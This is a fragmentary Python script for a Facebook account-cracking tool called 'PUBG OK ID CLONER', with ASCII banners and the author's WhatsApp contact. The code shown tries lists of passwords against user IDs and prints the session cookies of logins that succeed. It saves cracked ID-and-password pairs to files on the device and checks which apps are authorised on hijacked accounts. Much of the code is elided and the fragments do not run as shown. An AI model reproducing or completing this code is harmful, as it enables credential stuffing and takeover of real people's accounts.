...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By 4D33L KING")
...
def menu_apikey():
  ...
  |__/     |__/|__/|__/  |__/  |__/ \______/                                                                                                                                                   
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : 4deel l3ghari      │
    │ [✓] GITHUB   : 4D33L KING.           nn              │
    │ [✓] WHATSAPP : 3444819642             │
    │ [✓] TOOLS    : \033[1;32m PUBG OKID CLONER  \033[1;37m      │
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/03444819642?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
logo=("""\033[1;37m             
  ...
  |__/     |__/|__/|__/  |__/  |__/ \______/                                                                                                                                                   
    ...
    │ [✓] AUTHOR   : 4DEEL KING     │
    │ [✓] GITHUB   : LTC             │
    │ [✓] WHATSAPP : 03444819642        │
    │ [✓] TOOLS    : \033[1;32m PUBG OK ID CLONER  \033[1;37m      │
    │ [✓] VRISON   : \033[1;32m 1.0.9  \033[1;37m               │
    └───────────────────────────────────────┘""")          
def cek_apk(session,coki):
    w=session.rn("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/03444819642');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/ved.baghel.39');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.facebook.com/ved.baghel.39');time.sleep(1)
		admin()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/4D33L KINGok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/4D33L KING-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def b(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [4D33L KING>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [💥] COOKIE : '+coki)
